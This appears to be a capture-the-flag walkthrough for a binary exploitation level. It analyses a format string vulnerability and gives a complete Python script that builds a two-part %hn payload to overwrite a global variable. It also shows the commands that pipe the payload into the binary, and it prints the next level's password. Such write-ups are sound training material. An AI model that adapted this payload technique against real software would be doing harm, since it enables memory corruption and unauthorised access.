# Level 04 Walkthrough

## Binary analysis

The binary is vulnerable to a format string attack. The global variable `m` (address: 0x08049810) must be set to 0x01025544 to trigger the call to `system("/bin/cat /home/user/level5/.pass")`.

Relevant code:
```
0804847a        char buf[0x208]
0804847a        fgets(&buf, n: 0x200, fp: __bss_start)
08048488        p(&buf)
0804848d        uint32_t m_1 = m
08048497        if (m_1 != 0x1025544)
080484a6            return m_1
080484a0        return system(line: "/bin/cat /home/user/level5/.pass")
```

## Exploitation

We use a format string payload to write 0x01025544 into the global variable `m` using two half-word writes.

Python script to generate the payload:
```python
import struct

def p32(n):
    return struct.pack("<I", n)

OFFSET = 12
WRITE_ADDR = 0x08049810
WRITE_VAL = 0x01025544

val_low = WRITE_VAL & 0xFFFF
val_high = (WRITE_VAL >> 16) & 0xFFFF

addr_low = WRITE_ADDR
addr_high = WRITE_ADDR + 2

writes = [
    (addr_low, val_low),
    (addr_high, val_high),
]
writes.sort(key=lambda x: x[1])

addrs_part = b"".join(p32(addr) for addr, val in writes)

format_part = b""

written_bytes = len(addrs_part)

for i, (addr, val) in enumerate(writes):
    padding = (val - written_bytes) & 0xFFFF
    if padding == 0:
        padding = 0x10000
    param_num = OFFSET + i
    format_part += b"%" + str(padding).encode('ascii') + b"x"
    format_part += b"%" + str(param_num).encode('ascii') + b"$hn"
    written_bytes += padding

payload = addrs_part + format_part

with open("payload.txt", "wb") as f:
    f.write(payload)
```

## Commands used

```
cat payload.txt | ./level4
ls
cat /home/user/level5/.pass
```

## Result

After running the exploit, we get the password for level5:

```
cat /home/user/level5/.pass
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

Copy the password for the next level. 